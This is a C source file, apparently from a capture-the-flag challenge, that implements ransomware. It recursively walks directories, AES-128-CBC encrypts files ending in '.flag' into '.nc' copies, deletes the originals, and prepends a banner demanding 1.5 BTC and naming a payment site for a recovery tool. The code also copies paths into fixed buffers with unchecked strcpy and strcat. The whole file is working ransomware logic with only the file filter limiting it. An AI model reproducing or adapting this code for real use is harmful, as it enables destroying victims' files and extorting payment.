const int kFileId = 1;
#include <openssl/bn.h>
#include <openssl/ec.h>
#include <openssl/objects.h>
#include <openssl/rand.h>
#include <openssl/aes.h>
#include <dirent.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <limits.h>
#include "assert.h"
#include "secret.h"
#include "ping.h"

char g_banner[1024];

void initbanner() {
  EC_GROUP *pgroup = EC_GROUP_new_by_curve_name(NID_secp256k1);
  assert(pgroup);

  sprintf(g_banner,
    "Your file has been encrypted with the highest AES-128-CBC!\n"
    "\n"
    "To recover your files you must pay a sum of 1.5 BTC to the following \n"
    "Bitcoin address:\n"
    "  %s\n"
    "\n"
    "Once you have completed payment, visit the following site:\n"
    "  %s\n"
    "\n"
    "And enter this information:\n"
    "  cp=%s\n"
    "  wk=%s\n"
    "\n"
    "If your payment is complete, you will receive a tool to recover your\n"
    "files.\n"
    ".\n",
    g_bitcoin_address,
    g_host,
    EC_POINT_point2hex(
        pgroup, g_client_public, POINT_CONVERSION_COMPRESSED, NULL),
    BN_bn2hex(g_wrapped_key));
}

static void encrypt(const char *path) {
  printf("encrypt: %s\n", path);
  int fd1 = open(path, O_RDONLY);
  assert(fd1 >= 0);

  char newpath[PATH_MAX];
  strcpy(newpath, path);
  strcat(newpath, ".nc");
  int fd2 = open(newpath, O_WRONLY | O_CREAT | O_TRUNC, 0666);
  assert(fd2 >= 0);

  assert(write(fd2, g_banner, strlen(g_banner)) == (ssize_t)strlen(g_banner));

  // mcrypt 2.6.8 "bare" format

  // IV
  unsigned char iv[16];
  assert(sizeof(g_rawsecret) == sizeof(iv));
  assert(RAND_bytes(iv, sizeof(iv)) == 1);

  assert(write(fd2, iv, sizeof(iv)) == sizeof(iv));

  AES_KEY key;
  assert(AES_set_encrypt_key(g_rawsecret, sizeof(g_rawsecret) * 8, &key) == 0);
  for (;;) {
    unsigned char in[16];
    unsigned char out[16];
    assert(sizeof(g_rawsecret) == sizeof(in));
    assert(sizeof(g_rawsecret) == sizeof(out));
    ssize_t rc = read(fd1, in, sizeof(in));
    assert(rc >= 0);
    if (rc == 0) {
      break;
    } else if (rc < (ssize_t)sizeof(in)) {
      memset(in + rc, 0, sizeof(in) - rc);
      in[sizeof(in) - 1] = rc;
    }

    AES_cbc_encrypt(in, out, sizeof(in), &key, iv, AES_ENCRYPT);

    rc = write(fd2, out, sizeof(out));
    assert(rc == sizeof(out));
  }

  assert(close(fd2) >= 0);
  assert(close(fd1) >= 0);
  assert(unlink(path) >= 0);
}

void encryptall(char *path) {
  DIR* dir = opendir(path);
  assert(dir);

  strcat(path, "/");
  char *pathend = path + strlen(path);

  struct dirent *dp;
  while ((dp = readdir(dir))) {
    strcpy(pathend, dp->d_name);
    if (dp->d_type & DT_DIR && dp->d_name[0] != '.') {
      encryptall(path);
    } else if (dp->d_type & DT_REG) {
      size_t len = strlen(dp->d_name);
      if (len >= 5 && !strcmp(&dp->d_name[len - 5], ".flag")) {
        encrypt(path);
      }
    }
  }

  assert(closedir(dir) >= 0);
}
